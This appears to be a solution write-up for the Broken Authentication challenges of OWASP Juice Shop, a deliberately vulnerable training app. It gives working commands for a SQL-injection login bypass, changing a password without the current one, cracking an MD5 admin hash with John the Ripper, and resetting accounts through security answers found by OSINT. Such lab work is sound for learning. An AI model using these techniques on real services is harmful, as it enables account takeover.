# Broken Authentication

## Bjoern's Favorite Pet

Reset the password of Bjoern's OWASP account via the Forgot Password mechanism

```bash
# from db
bjoern@owasp.org

# Zaya
https://twitter.com/bkimminich/status/1441659996589207555
```

## Change Bender's Password

Change Bender's password into `slurmCl4ssic` without using SQL Injection or Forgot Password

```bash
TOKEN="<REDACTED>"

# remove parameter "current"
http -A bearer -a ${TOKEN} "juiceshop:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic"
```

## GDPR Data Erasure

Log in with Chris' erased user account

```bash
http http://juiceshop:3000/rest/user/login email="chris.pike@juice-sh.op'--"
```

## Login Bjoern

Log in with Bjoern's Gmail account

```javascript
// search for "oauth" in main.js
this.userService.oauthLogin(this.parseRedirectUrlParams().access_token).subscribe(
o => {
  const a = btoa(o.email.split('').reverse().join(''));
  this.userService.save({
    email: o.email,
    password: a,
    passwordRepeat: a
  }).subscribe(() => {
    this.login(o)
  }, () => {
    this.login(o)
  })
}

// web console
btoa("bjoern.kimminich@gmail.com".split('').reverse().join(''))

// email: bjoern.kimminich@gmail.com
// password: bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
```

## Password Strength

* [John the Ripper step-by-step tutorials for end-users](https://openwall.info/wiki/john/tutorials)

<!--

https://4n3i5v74.github.io/posts/cheatsheet-john-the-ripper
https://4n3i5v74.github.io/posts/tryhackme-john-the-ripper

-->

Log in with the administrator's user credentials without previously changing them or applying SQL Injection

```bash
# email: admin@juice-sh.op
# password (hash): 0192023a7bbd73250516f069df18b500

# MD5
hashid 0192023a7bbd73250516f069df18b500

# download wordlist
curl -sSL https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz | tar -xzf -

# crack
echo "admin@juice-sh.op:0192023a7bbd73250516f069df18b500" > juiceshop.hash
john --wordlist=rockyou.txt --format=raw-md5 juiceshop.hash

http http://juiceshop:3000/rest/user/login email="admin@juice-sh.op" password='admin123'
```

## Reset Bender's Password

Reset Bender's password via the Forgot Password mechanism

```bash
# email
# bender@juice-sh.op

# security question
# "Company you first work for as an adult?"

# https://en.wikipedia.org/wiki/Bender_(Futurama)
# https://futurama.fandom.com/wiki/Suicide_Booth

# escape the apostrophe with a backslash in addition to wrapping it in a set of single quotes: '\''
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"bender@juice-sh.op","answer":"Stop'\''n'\''Drop","new":"12345","repeat":"12345"}'
```

## Reset Bjoern's Password

Reset the password of Bjoern's internal account via the Forgot Password mechanism

```bash
# email
# bjoern@juice-sh.op

# security question
# "Your ZIP/postal code when you were a teenager?"

# https://www.facebook.com/bjoern.kimminich
# Uetersen has ZIP code 25436

# (from solution ???)
# https://www.alte-postleitzahlen.de/uetersen
# West-2082
```

## Reset Jim's Password

Reset Jim's password via the Forgot Password mechanism

```bash
# crack: ncc-1701
# "jim@juice-sh.op:e541ca7ecf72b8d1286474fc613e5e45"

# address
# "Room 3F 121, Deck 5, USS Enterprise, 1701, Space"

# security question
# "Your eldest siblings middle name?"

# https://en.wikipedia.org/wiki/James_T._Kirk
# George Samuel Kirk (brother)
# >>> Samuel
```

## Two Factor Authentication

Solve the 2FA challenge for user "wurstbrot"

```bash
# use sql injection to skip the password
# email: "wurstbrot@juice-sh.op'--"
# password: "foo"

# setup 2FA manually on the phone
# totpSecret: IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
```
